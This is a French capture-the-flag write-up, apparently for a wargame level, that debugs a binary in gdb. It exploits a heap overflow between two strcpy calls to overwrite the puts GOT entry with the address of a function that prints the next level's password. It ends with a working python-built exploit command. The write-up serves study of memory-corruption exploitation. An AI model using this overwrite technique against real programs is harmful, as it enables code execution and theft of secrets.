On a un programme qui segfault sans argument, ou avec un argument, mais pas au dela de deux argument.
En regardant dans gdb, on trouve beaucoup de chose:
(gdb) info functions
 ...
0x08048440  _start
0x08048470  __do_global_dtors_aux
0x080484d0  frame_dummy
0x080484f4  m
0x08048521  main
0x08048610  __libc_csu_init
...

On voit notre fonction main et une fonction m.

(gdb) disas main
       0x08048521 <+0>:	push   %ebp
   0x08048522 <+1>:	mov    %esp,%ebp
   0x08048524 <+3>:	and    $0xfffffff0,%esp
   0x08048527 <+6>:	sub    $0x20,%esp
   0x0804852a <+9>:	movl   $0x8,(%esp)
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    %eax,0x1c(%esp)
   0x0804853a <+25>:	mov    0x1c(%esp),%eax
   0x0804853e <+29>:	movl   $0x1,(%eax)
   0x08048544 <+35>:	movl   $0x8,(%esp)
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    %eax,%edx
   0x08048552 <+49>:	mov    0x1c(%esp),%eax
   0x08048556 <+53>:	mov    %edx,0x4(%eax)
   0x08048559 <+56>:	movl   $0x8,(%esp)
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    %eax,0x18(%esp)
   0x08048569 <+72>:	mov    0x18(%esp),%eax
   0x0804856d <+76>:	movl   $0x2,(%eax)
   0x08048573 <+82>:	movl   $0x8,(%esp)
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:	mov    %eax,%edx
   0x08048581 <+96>:	mov    0x18(%esp),%eax
   0x08048585 <+100>:	mov    %edx,0x4(%eax)
   0x08048588 <+103>:	mov    0xc(%ebp),%eax
   0x0804858b <+106>:	add    $0x4,%eax
   0x0804858e <+109>:	mov    (%eax),%eax
   0x08048590 <+111>:	mov    %eax,%edx
   0x08048592 <+113>:	mov    0x1c(%esp),%eax
   0x08048596 <+117>:	mov    0x4(%eax),%eax
   0x08048599 <+120>:	mov    %edx,0x4(%esp)
   0x0804859d <+124>:	mov    %eax,(%esp)
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:	mov    0xc(%ebp),%eax
   0x080485a8 <+135>:	add    $0x8,%eax
   0x080485ab <+138>:	mov    (%eax),%eax
   0x080485ad <+140>:	mov    %eax,%edx
   0x080485af <+142>:	mov    0x18(%esp),%eax
   0x080485b3 <+146>:	mov    0x4(%eax),%eax
    0x080485b6 <+149>:	mov    %edx,0x4(%esp)
   0x080485ba <+153>:	mov    %eax,(%esp)
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:	mov    $0x80486e9,%edx
   0x080485c7 <+166>:	mov    $0x80486eb,%eax
   0x080485cc <+171>:	mov    %edx,0x4(%esp)
   0x080485d0 <+175>:	mov    %eax,(%esp)
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    %eax,0x8(%esp)
   0x080485dc <+187>:	movl   $0x44,0x4(%esp)
   0x080485e4 <+195>:	movl   $0x8049960,(%esp)
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	movl   $0x8048703,(%esp)
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    $0x0,%eax
   0x08048601 <+224>:	leave  
   0x08048602 <+225>:	ret 

On a énormément de choses.
on a 4 malloc, 2 strcpy, 1 fopen, 1 fgets, et 1 puts.
si on regarde les arguments de fopen, fgets, et puts:

fopen:
(gdb) x/s 0x80486e9
    0x80486e9:	 "r"
(gdb) x/s 0x80486eb
    0x80486eb:	 "/home/user/level8/.pass"
=> fopen ouvre en lecture ("r") le fichier "/home/user/level8/.pass", c'est très intéressant.

fgets:
(gdb) x/s 0x8049960
    0x8049960 <c>:	 ""
=> fgets va lire le fichier et stocker 68 octets (movl $0x44,0x4(%esp)) du fichier dans la variable c.

puts:
(gdb) x/s 0x8048703
    0x8048703:	 "~~"
=> puts affiche simplement 2 ~

Maintenant voyons ce que la fonction m contient:
(gdb) disas m
    0x080484f4 <+0>:	push   %ebp
   0x080484f5 <+1>:	mov    %esp,%ebp
   0x080484f7 <+3>:	sub    $0x18,%esp
   0x080484fa <+6>:	movl   $0x0,(%esp)
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    $0x80486e0,%edx
   0x0804850b <+23>:	mov    %eax,0x8(%esp)
   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:	mov    %edx,(%esp)
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave  
   0x08048520 <+44>:	ret

la fonction contient un printf avev des arguments:
(gdb) x/s 0x80486e0
    0x80486e0:	 "%s - %d\n"
(gdb) x/s 0x8049960
    0x8049960 <c>:	 ""
=> printf("%s - %d\n", c, time)

Donc la fonction printf est sensé affiché la variable c, justement celle qui contient ce que le fgets à lu dans le fichier .pass !
Il faut trouver un moyen d'executer cette fonction m.
Il faut forcément executer cette fonction une fois que la variable "c" est rempli, or la fonction executée après le fgets est un puts.
Il faut donc trouver le moyen d'écraser ce puts pour le remplacer par la fonction m.
on remarque le @plt (procedure linkage table) qui suit le puts, ce qui signifie que l'instruction lié à ce puts consiste à aller chercher la vrai fonction puts dans une librairie.

On cherche donc l'addresse du puts:
(gdb) x/i 0x8048400
   0x8048400 <puts@plt>:	jmp    *0x8049928

Notre addresse de puts se trouve a 8049928
Notre addresse de m se trouve à 080484f4

on va donc chercher le segfault pour connaitre la position où placer nos fonctions.

(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6 Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag 

    Program received signal SIGSEGV, Segmentation fault.
    0xb7eb8b59 in ?? () from /lib/i386-linux-gnu/libc.so.6

on recoit bien le segfault, mais il semblerait que l'EIP (c'est a dire l'extented instruction pointeur, qui traque l'addresse de l'instruction courante lorsqu'une application est lancée)
 n'est pas overide. En effet, l'addresse renvoyé au moment du segfault correspond bien à une instruction, et non a un de nos caractère entré en argument.

On tente de regarder les débordements ailleurs dans les autres registres:

(gdb) run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ LLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT
    Program received signal SIGSEGV, Segmentation fault.
    0xb7eb8b59 in ?? () from /lib/i386-linux-gnu/libc.so.6
(gdb) info registers
    eax            0x46464646	1179010630
    ecx            0xbffff8e4	-1073743644
    edx            0x46464646	1179010630
    ebx            0xbffff8f0	-1073743632
    esp            0xbffff6b4	0xbffff6b4
    ebp            0xbffff6e8	0xbffff6e8
    esi            0x0	0
    edi            0x46464646	1179010630  
    eip            0xb7eb8b59	0xb7eb8b59
    ...

On voit que EAX et EDX ne comporte pas des instruction mais 0x4646464646, ce qui correspond à FFFF.
EAX et EDX sont des registre utilisé pour les calculs, les opérations arithmetic, et pour envoyer des donner a des fonctions ou récupérer les donné des fonctions.
Il est donc fort probable, que eax et edx soit utilisé pour envoyer les arguments aux 2 strcpy(dest, src).

Regardons ce qui se passe dans la stack au niveau du 2e strcpy, après avoir fais un overflow après le premier strcpy:

(gdb) b *0x80485bd  (addresse du second strcpy)
(gdb) run AAAABBBBCCCCDDDDEEEEFFFF GGGG
    Starting program: /home/user/level7/level7 AAAABBBBCCCCDDDDEEEEFFFF GGGG
    Breakpoint 1, 0x080485bd in main ()
(gdb) x/20wx $sp
    0xbffff6f0:	0x46464646	0xbffff904	0xb7fd0ff4	0xb7e5ee55
    0xbffff700:	0xb7fed280	0x00000000	0x0804a028	0x0804a008
    0xbffff710:	0x08048610	0x00000000	0x00000000	0xb7e454d3
    0xbffff720:	0x00000003	0xbffff7b4	0xbffff7c4	0xb7fdc858
    0xbffff730:	0x00000000	0xbffff71c	0xbffff7c4	0x00000000
-> le premier élément de la stack est overflow par nos F (0x46464646) et le second élément correspond à l'addresse ou est stocké GGGG.
(gdb) x/s $eax
    0x46464646:	 <Address 0x46464646 out of bounds>
(gdb) x/s $edx
    0xbffff904:	 "GGGG"

On voit bien ici, que l'overflow crée par le premier strcpy à overflow eax, or eax est utilisé en tant que premier argument pour le 2nd strcpy,
c'est à dire en tant que destination. On a donc : strcpy(FFFF, 'GGGG').
Le mot GGGG va être écrit à l'addresse FFFF, au lieu d'etre écrit sur le malloc prévu à l'inital.

Puisqu'on peut écrire GGGG à l'addresse FFFF, pourquoi ne pas plutot ecrire l'addresse de m à l'addresse de puts:

./level7 "AAAABBBBCCCCDDDDEEEE + addresse de puts" "addresse de m"

Nos F étant à la 20e position dans notre string, l'Overflow à donc lieu à la 20e position, il ne reste qu'a écrire l'exploit ! :

$ ./level7 $(python -c 'print "AAAABBBBCCCCDDDDEEEE" + "\x08\x04\x99\x28"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]')
